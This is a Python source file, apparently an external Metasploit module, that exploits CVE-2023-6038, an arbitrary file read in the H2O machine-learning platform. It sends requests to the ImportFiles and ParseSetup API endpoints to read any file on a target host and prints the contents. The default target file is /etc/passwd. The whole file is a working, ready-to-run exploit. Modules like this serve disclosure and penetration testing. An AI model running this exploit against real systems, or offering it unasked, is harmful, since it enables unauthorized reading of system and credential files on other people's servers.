#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Request, Session
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'H2O arbitrary file read',
    'description': '''
        H2O is vulnerable to an local file include in it's ImportFiles API endpoint
    ''',
    'authors': [
        'byt3bl33d3r <marcello@protectai.com>',
        'danmcinerney <dan@protectai.com>'
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/83dd8619-6dc3-4c98-8f1b-e620fedcd1f6/'},
        {'type': 'cve', 'ref': 'CVE-2023-6038'}
    ],
    'type': 'single_scanner',
    'options': {
        'filepath': {'type': 'string', 'description': 'File to read', 'required': True, 'default': '/etc/passwd'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 54321},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    try:
        base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
        s = Session()
        r = s.get(f"{base_url}/3/ImportFiles", params={"path": args["filepath"]})
        logging.debug(r.url)

        r = s.post(f"{base_url}/3/ParseSetup", data={"source_frames": f"nfs:/{args['filepath']}"})
        logging.debug(r.url)

        logging.debug(f"{r.status_code} - {len(r.text)}")
    except requests.exceptions.RequestException as e:
        logging.error(str(e))
        return

    file_content = '\n'.join([ d[0] for d in r.json()['data'] ])
    logging.info(file_content)

if __name__ == '__main__':
    module.run(metadata, run)
